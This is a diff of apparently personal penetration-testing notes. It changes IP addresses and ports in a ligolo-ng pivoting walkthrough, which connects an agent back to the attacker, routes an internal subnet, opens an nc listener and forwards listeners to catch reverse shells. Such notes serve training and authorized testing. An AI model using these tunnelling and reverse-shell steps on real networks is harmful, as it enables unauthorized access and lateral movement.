@@ -485,7 +485,7 @@ sudo ip link set ligolo up
 On the other machine:
 
 ```bash
-agent.exe -connect 192.168.45.163:11601 -ignore-cert
+agent.exe -connect 192.168.49.140:11601 -ignore-cert
 ```
 
 On your machine:
@@ -498,7 +498,7 @@ session # select the session that you want to work with
 Add a rule to your iptables, another terminal windows:
 
 ```bash
-sudo ip route add 172.16.147.0/24 dev ligolo # interface 1
+sudo ip route add 172.16.140.0/24 dev ligolo # interface 1
 ip route list # confirm
 nc -lvnp 4444
 ```
@@ -512,7 +512,7 @@ start
 In order to receive reverse shells from machines on the internal network:
 
 ```bash
-listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
+listener_add --addr 0.0.0.0:3389 --to 127.0.0.1:3389
 listener-list # confirm
 ifconfig # get the INTERNAL ip address, which will be used to communicate to your personal kali machine on the external network
 ```
